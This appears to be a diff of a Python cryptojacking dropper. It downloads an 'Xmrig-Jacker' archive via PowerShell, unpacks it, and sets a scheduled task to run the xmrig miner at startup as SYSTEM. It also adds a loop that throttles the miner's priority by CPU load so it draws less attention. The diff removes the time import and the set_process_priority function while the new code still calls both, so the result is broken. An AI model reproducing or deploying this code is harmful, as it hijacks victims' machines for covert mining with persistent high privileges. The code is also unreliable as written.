@@ -1,15 +1,10 @@
 import os
 import subprocess
 import shutil
-import ctypes
-import time
 
 def download_and_extract(url, output_dir):
     subprocess.run(["powershell", "Invoke-WebRequest", url, "-OutFile", os.path.join(output_dir, "Xmrig-Jacker-main.zip")])
     shutil.unpack_archive(os.path.join(output_dir, "Xmrig-Jacker-main.zip"), output_dir)
-
-def set_process_priority(pid, priority):
-    subprocess.run(["wmic", "process", "where", f"ProcessId={pid}", "CALL", f"SetPriority {priority}"])
 
 def main():
     temp_dir = "C:/temp"
@@ -19,11 +14,32 @@ def main():
     download_and_extract(download_url, temp_dir)
 
     action = f'"{xmrig_path}"'
-    ctypes.windll.taskschd.TaskSchedulerSetSecurityDescriptor(None, 4)
     subprocess.run(["schtasks", "/Create", "/TN", "RunXmrig", "/SC", "ONSTART", "/RU", "SYSTEM", "/RL", "HIGHEST", "/TR", action])
 
     # Start the xmrig.exe process immediately
     subprocess.Popen([xmrig_path])
+
+    process_name = "xmrig.exe"
+    high_usage_threshold = 75
+    low_usage_threshold = 25
+
+    while True:
+        cpu_usage = subprocess.check_output(["wmic", "cpu", "get", "loadpercentage"]).decode("utf-8").split()[1]
+        cpu_usage = int(cpu_usage)
+        
+        if cpu_usage >= high_usage_threshold:
+            for proc in subprocess.check_output(["tasklist"]).decode("utf-8").splitlines():
+                if process_name in proc:
+                    pid = int(proc.split()[1])
+                    set_process_priority(pid, "Idle")
+
+        elif cpu_usage < low_usage_threshold:
+            for proc in subprocess.check_output(["tasklist"]).decode("utf-8").splitlines():
+                if process_name in proc:
+                    pid = int(proc.split()[1])
+                    set_process_priority(pid, "Normal")
+
+        time.sleep(5)
 
 if __name__ == "__main__":
     main()
